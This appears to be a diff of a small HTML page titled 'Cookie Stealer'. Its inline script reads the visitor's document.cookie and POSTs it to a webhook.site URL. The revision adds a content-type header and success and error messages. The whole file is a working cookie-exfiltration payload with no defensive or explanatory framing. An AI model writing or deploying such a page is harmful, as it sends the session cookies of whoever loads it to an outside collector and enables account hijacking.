@@ -1,19 +1,23 @@
 <!DOCTYPE html>
 <html>
-  <head><title>Steal Cookie</title></head>
+  <head><title>Cookie Stealer</title></head>
   <body>
-    <h2>Stealing cookie...</h2>
+    <h2>✅ Stealing cookie...</h2>
     <script>
-      const cookie = document.cookie;
+      // Display something immediately
+      document.body.innerHTML += "<p>Trying to send cookie...</p>";
 
-      // Send to webhook
+      // Actually send the cookie
       fetch("https://webhook.site/9f55de09-3788-4b74-9f67-8c7bbc6f5626", {
         method: "POST",
-        body: cookie
+        headers: { "Content-Type": "text/plain" },
+        body: document.cookie
+      }).then(() => {
+        // Confirm it was sent
+        document.body.innerHTML += "<p>✅ Sent: " + document.cookie + "</p>";
+      }).catch((err) => {
+        document.body.innerHTML += "<p>❌ Error: " + err + "</p>";
       });
-
-      // Also show it on screen
-      document.body.innerHTML += "<p>✅ Sent: " + cookie + "</p>";
     </script>
   </body>
 </html>
